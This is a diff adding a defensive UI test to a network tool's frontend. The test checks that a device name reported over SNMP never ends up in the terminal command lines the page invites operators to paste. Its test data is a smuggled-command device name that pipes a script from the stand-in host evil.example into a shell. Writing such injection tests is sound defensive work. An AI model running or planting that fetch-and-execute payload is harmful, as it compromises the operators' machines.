@@ -243,6 +243,34 @@ describe("following one record", () => {
     await pickDevice("leaf1");
     expect(screen.getByText(/correlix-debug trace --kind syslog --device leaf1/)).toBeTruthy();
   });
+
+  // 3.9-03. A discovered device names ITSELF. Nothing between the wire and this
+  // screen checks the characters in a sysName, so the command line this page
+  // invites an operator to paste into a terminal must never carry one back.
+  it("shows no command line for a device name a terminal would read as instructions", async () => {
+    const hostile = "core1; curl http://evil.example/x.sh|sh";
+    mockApi.devices.mockResolvedValue([
+      { id: "d9", name: hostile, address: "10.0.0.9", source: "snmp", last_seen: STARTED },
+    ]);
+    setup();
+    await pickDevice(hostile);
+    // No trace command line at all — not a quoted one, not a truncated one.
+    // The page's other command lines (bundle, logs) carry no device name.
+    expect(screen.queryByText(/correlix-debug trace/)).toBeNull();
+    for (const cli of screen.queryAllByLabelText("the same action from a terminal")) {
+      expect(cli.textContent).not.toMatch(/correlix-debug trace/);
+    }
+    // The name is still SHOWN in the picker, which is right — the operator has
+    // to be able to see and choose the device. What must not happen is the name
+    // reaching a line the page tells a person to paste: no command line on this
+    // screen carries any of it.
+    for (const cli of screen.queryAllByLabelText("the same action from a terminal")) {
+      expect(cli.textContent).not.toMatch(/evil\.example/);
+      expect(cli.textContent).not.toMatch(/core1/);
+    }
+    // The screen says why, in the operator's own terms.
+    expect(screen.getByText(/carries characters a terminal would read as instructions/)).toBeTruthy();
+  });
 });
 
 // ── 5. saved runs ───────────────────────────────────────────────────────────
